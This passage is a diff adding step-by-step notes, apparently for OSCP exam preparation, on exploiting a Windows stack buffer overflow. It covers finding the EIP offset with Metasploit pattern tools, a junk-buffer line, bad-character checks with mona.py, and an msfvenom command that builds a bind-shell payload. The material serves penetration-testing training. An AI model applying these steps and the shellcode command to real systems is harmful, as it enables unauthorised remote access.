@@ -1,0 +1,27 @@
+1 - Open the vulnerable system and the immunity debugger and attach the process in the immunity debugger to trace the memory process
+
+2 - Create a pattern with the next metasploit functionality and send the generate data to the system with the start script:  “/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000”
+
+
+2 - When the system crash, We need to take the value of EIP in the immunity debugger, in this case was 42396E42
+
+3 - We need to calculate the offset value to know in what value the system crashes. With the metasploit you can get this value 
+“/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 42396E42”
+
+
+4 - With the offset value obtained (1197), now you, that in this value the system crash and now you can proceed to control the EIP
+
+5 - Now, We can use the last value in Our script to obtain the value of ESP
+junk = "\x41" * 1197 + "\x42" * 4
+
+6 - Then, you need send all var char in your script to the system to obtain all bad characters and clean it.
+
+7 - With the mona.py utility you can evade all bad characters detected, use this command to obtain this information by the easy way
+!mona compare -f C:\Users\admin\Desktop\oscp_exam\bytearray.bin -a <ValorESP>
+Result: 00 04 05 1c 1d 2f 30 87 88 89 8a
+
+7 - now, you can generate your own payload with msfvenom and exclude all bad characters.
+
+“msfvenom -p windows/shell_bind_tcp EXITFUNC=thread LPORT=80 -a x86 --platform windows -b "\x00\x04\x05\x1c\x1d\x2f\x30\x87\x88\x89\x8a" -f c”
+
+
